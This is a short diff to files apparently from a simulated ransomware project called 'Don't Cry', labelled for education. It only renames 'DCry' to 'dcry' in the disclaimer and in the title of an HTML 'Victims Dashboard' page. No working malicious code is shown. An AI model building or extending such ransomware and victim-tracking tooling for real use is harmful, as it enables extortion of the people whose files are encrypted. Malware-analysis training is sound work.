@@ -2,7 +2,7 @@
 #                             Don't Cry Ransomware                             #
 #                          ! EDUCATIONAL PURPOSES ONLY !                       #
 ################################################################################
-# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
+# DISCLAIMER: This is a simulated ransomware (dcry), written for cybersecurity
 # research, ethical hacking education, and malware analysis training only.
 # It mimics the behavior of real ransomware but must NOT be used for illegal or
 # unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
@@ -252,14 +252,14 @@ def dashboard():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DCry Victims Dashboard</title>
+    <title>dcry Victims Dashboard</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <style> body { padding: 1.5rem; } .container h1 { margin-bottom: 1.5rem; } </style>
 </head>
 <body>
     <div class="container">
         <div class="d-flex justify-content-between align-items-center mb-3">
-            <h1>DCry Victims Dashboard</h1>
+            <h1>dcry Victims Dashboard</h1>
         </div>
         <div class="mb-3">
             <input type="text" id="searchInput" class="form-control" placeholder="Search by Username or ID...">
